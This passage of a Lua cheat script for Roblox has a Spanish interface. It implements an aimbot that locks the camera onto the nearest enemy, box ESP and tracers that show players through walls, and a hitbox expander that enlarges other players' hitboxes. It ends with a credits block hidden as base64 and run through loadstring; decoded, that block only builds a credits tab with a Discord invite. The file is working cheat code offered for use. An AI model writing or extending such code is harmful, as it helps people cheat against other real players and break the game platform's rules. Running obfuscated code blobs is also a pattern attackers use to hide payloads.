        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
            -- Verificar si no es del mismo equipo
            if AimbotSettings.TeamCheckEnabled and v.Team == LocalPlayer.Team then
                continue
            end
            
            local targetPos = v.Character.HumanoidRootPart.Position

            -- WallCheck
            if AimbotSettings.WallCheck then
                local origin = Camera.CFrame.Position
                local direction = targetPos - origin
                local rayParams = RaycastParams.new()
                rayParams.FilterType = Enum.RaycastFilterType.Blacklist
                rayParams.FilterDescendantsInstances = {LocalPlayer.Character}
                
                local result = workspace:Raycast(origin, direction, rayParams)
                if result and result.Instance and not v.Character:IsAncestorOf(result.Instance) then
                    continue -- Algo bloquea la visión
                end
            end

            local screenPoint, onScreen = Camera:WorldToViewportPoint(targetPos)
            if onScreen then
                local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - UserInputService:GetMouseLocation()).Magnitude
                -- Verificar si está dentro del FOV y si el jugador está cerca (si la opción está activada)
                if distance < shortestDistance and distance < AimbotSettings.FOVRadius then
                    -- Verificar si solo queremos apuntar a jugadores cercanos
                    local distFromPlayer = (targetPos - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if AimbotSettings.OnlyClosePlayers and distFromPlayer > AimbotSettings.CloseDistanceThreshold then
                        continue
                    end

                    shortestDistance = distance
                    closestPlayer = v
                end
            end
        end
    end

    return closestPlayer
end


-- Input para apuntar
UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        Holding = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        Holding = false
    end
end)

-- Aimbot + FOV Circle
RunService.RenderStepped:Connect(function()
    FOVCircle.Position = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y - 36)
    FOVCircle.Radius = AimbotSettings.FOVRadius
    FOVCircle.Color = AimbotSettings.FOVColor
    FOVCircle.Visible = (Holding or AimbotSettings.AutoAimEnabled) and AimbotSettings.Enabled

    if AimbotSettings.Enabled and (Holding or AimbotSettings.AutoAimEnabled) then
        local target = GetClosestPlayer()
        if target and target.Character and target.Character:FindFirstChild(AimbotSettings.AimPart) then
            local aimPos = target.Character[AimbotSettings.AimPart].Position
            local camPos = Camera.CFrame.Position
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, aimPos)
        end
    end
end)

-- BOX ESP
local ESPBoxes = {}

RunService.RenderStepped:Connect(function()
    for _, box in pairs(ESPBoxes) do
        if box and box.Remove then
            box:Remove()
        end
    end
    ESPBoxes = {}

    if not AimbotSettings.ESPEnabled then return end

    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart")
            and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then

            if AimbotSettings.TeamCheckEnabled and v.Team == LocalPlayer.Team then
                continue
            end

            local hrp = v.Character.HumanoidRootPart
            local rootPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)

            if onScreen then
                local distFromPlayer = (hrp.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                local scaleFactor = 1 / (hrp.Position - Camera.CFrame.Position).Magnitude * 100
                local boxHeight = math.clamp(6 * scaleFactor * AimbotSettings.ESPSizeMultiplier, 2, 500)
                local boxWidth = boxHeight / 1.5

                local box = Drawing.new("Square")
                box.Color = (AimbotSettings.OnlyClosePlayers and distFromPlayer <= AimbotSettings.CloseDistanceThreshold)
    and Color3.fromRGB(255, 0, 0)
    or AimbotSettings.ESPColor
                box.Thickness = 1
                box.Filled = false
                box.Transparency = 1
                box.Size = Vector2.new(boxWidth, boxHeight)
                box.Position = Vector2.new(rootPos.X - boxWidth / 2, rootPos.Y - boxHeight / 2)
                box.Visible = true

                table.insert(ESPBoxes, box)
            end
        end
    end
end)

-- Tracers
local Lines = {}

RunService.RenderStepped:Connect(function()
    for _, line in pairs(Lines) do
        if line and line.Remove then
            line:Remove()
        end
    end
    Lines = {}

    if AimbotSettings.TracersEnabled then
        for _, v in ipairs(Players:GetPlayers()) do
            if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart")
               and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then

                if AimbotSettings.TeamCheckEnabled and v.Team == LocalPlayer.Team then
                    continue
                end

                local hrp = v.Character.HumanoidRootPart
                local screenPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)

                if onScreen then
                    local distFromPlayer = (hrp.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude

                    local line = Drawing.new("Line")
                    line.Thickness = 1.5
                    line.Transparency = 0.9
                    line.Color = (AimbotSettings.OnlyClosePlayers and distFromPlayer <= AimbotSettings.CloseDistanceThreshold)
    and Color3.fromRGB(255, 0, 0)
    or AimbotSettings.TracerColor

                    line.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                    line.To = Vector2.new(screenPos.X, screenPos.Y)
                    line.Visible = true

                    table.insert(Lines, line)
                end
            end
        end
    end
end)

-- UI Rayfield
AimbotTab:CreateToggle({
    Name = "Aimbot",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.Enabled = state
    end
})

AimbotTab:CreateToggle({
    Name = "Auto Apuntar",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.AutoAimEnabled = state
    end
})

AimbotTab:CreateSlider({
    Name = "Tamaño del FOV",
    Range = {10, 1000},
    Increment = 1,
    CurrentValue = AimbotSettings.FOVRadius,
    Callback = function(val)
        AimbotSettings.FOVRadius = val
    end
})

AimbotTab:CreateToggle({
    Name = "Wall Check",
    CurrentValue = AimbotSettings.WallCheck,
    Callback = function(value)
        AimbotSettings.WallCheck = value
    end
})

AimbotTab:CreateColorPicker({
    Name = "Color del FOV",
    Color = AimbotSettings.FOVColor,
    Callback = function(val)
        AimbotSettings.FOVColor = val
    end
})

AimbotTab:CreateToggle({
    Name = "ESP",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.ESPEnabled = state
    end
})

AimbotTab:CreateColorPicker({
    Name = "Color del ESP",
    Color = AimbotSettings.ESPColor,
    Callback = function(val)
        AimbotSettings.ESPColor = val
    end
})

AimbotTab:CreateSlider({
    Name = "Tamaño del ESP",
    Range = {1, 10},
    Increment = 0.1,
    CurrentValue = AimbotSettings.ESPSizeMultiplier,
    Callback = function(val)
        AimbotSettings.ESPSizeMultiplier = val
    end
})

AimbotTab:CreateToggle({
    Name = "No apuntar al Team",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.TeamCheckEnabled = state
    end
})

AimbotTab:CreateToggle({
    Name = "Mostrar Líneas (Tracers)",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.TracersEnabled = state
    end
})

AimbotTab:CreateColorPicker({
    Name = "Color de las Líneas (Tracers)",
    Color = AimbotSettings.TracerColor,
    Callback = function(val)
        AimbotSettings.TracerColor = val
    end
})

AimbotTab:CreateToggle({
    Name = "Apuntar a jugadores cercanos",
    CurrentValue = false,
    Callback = function(state)
        AimbotSettings.OnlyClosePlayers = state
    end
})

AimbotTab:CreateSlider({
    Name = "Distancia",
    Range = {1, 300},
    Increment = 1,
    CurrentValue = AimbotSettings.CloseDistanceThreshold,
    Callback = function(val)
        if AimbotSettings.OnlyClosePlayers then
            AimbotSettings.CloseDistanceThreshold = val
        end
    end
})


local rainbowEnabled = false  -- Controlar el toggle único
local rainbowSpeed = 5  -- Velocidad del cambio de colores

local function GetRainbowColor()
    local time = tick() * rainbowSpeed
    return Color3.fromHSV(time % 1, 1, 1)
end


AimbotTab:CreateToggle({
    Name = "Rainbow",
    CurrentValue = false,
    Flag = "RainbowEffects",
    Callback = function(Value)
        rainbowEnabled = Value
    end
})

-- Crear un slider para la velocidad de cambio de color
AimbotTab:CreateSlider({
    Name = "Rainbow",
    Range = {0, 20},  -- Rango de velocidad
    Increment = 0.1,  -- Incremento de 1
    CurrentValue = rainbowSpeed,
    Callback = function(Value)
        rainbowSpeed = Value
    end
})

-- Cambiar colores en cada paso del RenderStepped
RunService.RenderStepped:Connect(function()
    if rainbowEnabled then
        -- FOV Rainbow
        AimbotSettings.FOVColor = GetRainbowColor()

        -- ESP Rainbow
        AimbotSettings.ESPColor = GetRainbowColor()

        -- Tracers Rainbow
        AimbotSettings.TracerColor = GetRainbowColor()
    end
end)


----Hitbox Espander---- 
---- Hitbox Expander Optimizado sin Noclip ----
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local PhysicsService = game:GetService("PhysicsService")

local HitboxTab = Window:CreateTab("Hitbox", nil)

getgenv().HitboxSize = 15
getgenv().HitboxTransparency = 0.9
getgenv().HitboxStatus = false
getgenv().TeamCheck = false

-- Crear grupo de colisión sin colisiones
pcall(function()
    PhysicsService:RegisterCollisionGroup("NoCollision")
    PhysicsService:CollisionGroupSetCollidable("NoCollision", "NoCollision", false)
end)

local function applyNoCollision(part)
    if part and part:IsA("BasePart") then
        PhysicsService:SetPartCollisionGroup(part, "NoCollision")
    end
end

local function applyNoCollisionToCharacter(character)
    for _, part in pairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            applyNoCollision(part)
        end
    end
end

local function updateHitboxes()
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = v.Character.HumanoidRootPart
            local isEnemy = not getgenv().TeamCheck or (v.Team ~= Players.LocalPlayer.Team)

            local size = isEnemy and Vector3.new(getgenv().HitboxSize, getgenv().HitboxSize, getgenv().HitboxSize) or Vector3.new(2, 2, 1)
            local transparency = isEnemy and getgenv().HitboxTransparency or 1
            local color = isEnemy and BrickColor.new("Really black") or BrickColor.new("Medium stone grey")
            local material = isEnemy and Enum.Material.Neon or Enum.Material.Plastic

            -- Solo cambia si es necesario
            if hrp.Size ~= size then hrp.Size = size end
            if hrp.Transparency ~= transparency then hrp.Transparency = transparency end
            if hrp.BrickColor ~= color then hrp.BrickColor = color end
            if hrp.Material ~= material then hrp.Material = material end
            if hrp.CanCollide then hrp.CanCollide = false end

            applyNoCollisionToCharacter(v.Character)
        end
    end
end

local function resetHitboxes()
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = v.Character.HumanoidRootPart
            if hrp.Size ~= Vector3.new(2, 2, 1) then hrp.Size = Vector3.new(2, 2, 1) end
            if hrp.Transparency ~= 1 then hrp.Transparency = 1 end
            if hrp.BrickColor ~= BrickColor.new("Medium stone grey") then hrp.BrickColor = BrickColor.new("Medium stone grey") end
            if hrp.Material ~= Enum.Material.Plastic then hrp.Material = Enum.Material.Plastic end
            if hrp.CanCollide then hrp.CanCollide = false end

            applyNoCollisionToCharacter(v.Character)
        end
    end
end

-- Toggle principal de Hitbox
local hitboxConnection
HitboxTab:CreateToggle({
    Name = "Hitbox Expander",
    CurrentValue = false,
    Flag = "HitboxToggle",
    Callback = function(state)
        getgenv().HitboxStatus = state

        if state then
            updateHitboxes()
            hitboxConnection = RunService.Heartbeat:Connect(function()
                if getgenv().HitboxStatus then
                    updateHitboxes()
                    task.wait(0.2) -- Ajusta la frecuencia según necesidad
                end
            end)
        else
            if hitboxConnection then
                hitboxConnection:Disconnect()
                hitboxConnection = nil
            end
            resetHitboxes()
        end
    end,
})

-- Toggle de Team Check
HitboxTab:CreateToggle({
    Name = "Team Checker",
    CurrentValue = false,
    Flag = "TeamCheckToggle",
    Callback = function(state)
        getgenv().TeamCheck = state
        if getgenv().HitboxStatus then
            updateHitboxes()
        end
    end,
})

-- Slider de tamaño del Hitbox
HitboxTab:CreateSlider({
    Name = "Tamaño del Hitbox",
    Range = {2, 500},
    Increment = 1,
    Suffix = "studs",
    CurrentValue = getgenv().HitboxSize,
    Flag = "HitboxSizeSlider",
    Callback = function(val)
        getgenv().HitboxSize = val
    end,
})

-- Slider de transparencia del Hitbox
HitboxTab:CreateSlider({
    Name = "Transparencia",
    Range = {0, 1},
    Increment = 0.05,
    CurrentValue = getgenv().HitboxTransparency,
    Flag = "HitboxTransparencySlider",
    Callback = function(val)
        getgenv().HitboxTransparency = val
    end,
})














 













----Temas---
themesTab = Window:CreateTab("temas", nil)
Section = themesTab:CreateSection("Cambia el tema")

-- Función para crear botones rápido
 function CreateThemeButton(name, theme)
    themesTab:CreateButton({
        Name = name,
        Callback = function()
            Window.ModifyTheme(theme)
            SaveTheme(theme)
        end
    })
end

CreateThemeButton("Black", "Default")
CreateThemeButton("AmberGlow", "AmberGlow")
CreateThemeButton("Amethyst", "Amethyst")
CreateThemeButton("Bloom", "Bloom")
CreateThemeButton("DarkBlue", "DarkBlue")
CreateThemeButton("Green", "Green")
CreateThemeButton("Light", "Light")
CreateThemeButton("Ocean", "Ocean")
CreateThemeButton("Serenity", "Serenity")

-- ColorPicker
ColorPicker = themesTab:CreateColorPicker({
    Name = "Color de fondo perzonalizado",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(color)
        Window.ModifyTheme({
            Background = color,
            Topbar = color,
            Border = color,
        })
        -- Opcionalmente podrías guardar colores también, pero sería más complicado
    end
})






----Creditos-----



-- Función para decodificar Base64
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function base64decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

-- Aquí va el script codificado en base64
local encoded = [[
LS0tLSBDcmVkaXRvcyAtLS0tCgpDcmVkaXRvc1RhYiA9IF9HLldpbmRvdzpDcmVhdGVUYWIoIkNyZWRpdG9zIiwgbmlsKQpDcmVkaXRvc1RhYjpDcmVhdGVTZWN0aW9uKCJDcmVhZG9yIikKCmxvY2FsIERpc2NvcmRJbnZpdGUgPSAiaHR0cHM6Ly9kaXNjb3JkLmdnL1pUVkM5NFptVloiCgpDcmVkaXRvc1RhYjpDcmVhdGVCdXR0b24oewogICAgTmFtZSA9ICJKb2FvX21vZHMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGVzYXJyb2xsYWRvciBkZSBKbW9kcyBVbml2ZXJzYWwgeSBZb3V0dWJlciIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBzZXRjbGlwYm9hcmQoRGlzY29yZEludml0ZSkKICAgICAgICBfRy5SYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJEaXNjb3JkISIsCiAgICAgICAgICAgIENvbnRlbnQgPSAiU2UgY29wacOzIGVsIGxpbmsgZGUgaW52aXRhY2nDs24sIG5vIG9sdmlkZXMgdmVyIHN1IGNhbmFsIiwKICAgICAgICAgICAgRHVyYXRpb24gPSA1LAogICAgICAgICAgICBJbWFnZSA9IDEzNDU4MDE3NDc4LAogICAgICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkgZW5kCiAgICAgICAgfSkKICAgIGVuZCwKfSkKCi0tIFRlc3RlcnMKQ3JlZGl0b3NUYWI6Q3JlYXRlU2VjdGlvbigiVGVzdGVycyIpCgoKQ3JlZGl0b3NUYWI6Q3JlYXRlUGFyYWdyYXBoKHsKICAgIFRpdGxlID0gImVyamF6enkiLAogICAgQ29udGVudCA9ICJjaHVwZW4gcGljbyIKfSkKCkNyZWRpdG9zVGFiOkNyZWF0ZVBhcmFncmFwaCh7CiAgICBUaXRsZSA9ICJBbmRyM3NzZiIsCiAgICBDb250ZW50ID0gIlRvcCAxIGRlIHRvcnJlb24gY29haHVpbGEiCn0pCgpDcmVkaXRvc1RhYjpDcmVhdGVQYXJhZ3JhcGgoewogICAgVGl0bGUgPSAic2FudGlhZ282NDIyNiIsCiAgICBDb250ZW50ID0gIk5vIGFzaSBlc3RhIGJpZW4iCn0pCgotLSBDb2xhYm9yYWRvcmVzCkNyZWRpdG9zVGFiOkNyZWF0ZVNlY3Rpb24oIkNvbGFib3JhZG9yZXMiKQoKQ3JlZGl0b3NUYWI6Q3JlYXRlUGFyYWdyYXBoKHsKICAgIFRpdGxlID0gIklORklOSVRZSEFDSyIsCiAgICBDb250ZW50ID0gIkplZmUgZGUgbG9zIGVuYW5vcyBhbGJpbm9zIPCfp5HigI3wn6ayIgp9KQoKCgpDcmVkaXRvc1RhYjpDcmVhdGVQYXJhZ3JhcGgoewogICAgVGl0bGUgPSAiSG9sYUNhcG9fOTQiLAogICAgQ29udGVudCA9ICJTaWdhbm1lIGVuIHJvYmxveCB4RCIKfSkgIAoKQ3JlZGl0b3NUYWI6Q3JlYXRlUGFyYWdyYXBoKHsKICAgIFRpdGxlID0gIkVsIENhemFkb3IiLAogICAgQ29udGVudCA9ICJqbW9kcyBlcyBlbCBtZWpvciB4ZCIKfSkgIAoKQ3JlZGl0b3NUYWI6Q3JlYXRlUGFyYWdyYXBoKHsKICAgIFRpdGxlID0gIk1hc2hh8J+SgPCflKUiLAogICAgQ29udGVudCA9ICJtZSBjb21pIGFsIG9zb28iCn0pICAKCkNyZWRpdG9zVGFiOkNyZWF0ZVBhcmFncmFwaCh7CiAgICBUaXRsZSA9ICJUdVRpb1BlcnVhbjAiLAogICAgQ29udGVudCA9ICJ4RCIKfSkgIAoKCgoKCgoKCgoKCgo=
]]

-- Decodificamos y ejecutamos
loadstring(base64decode(encoded))()




-----When haces tus momos en video
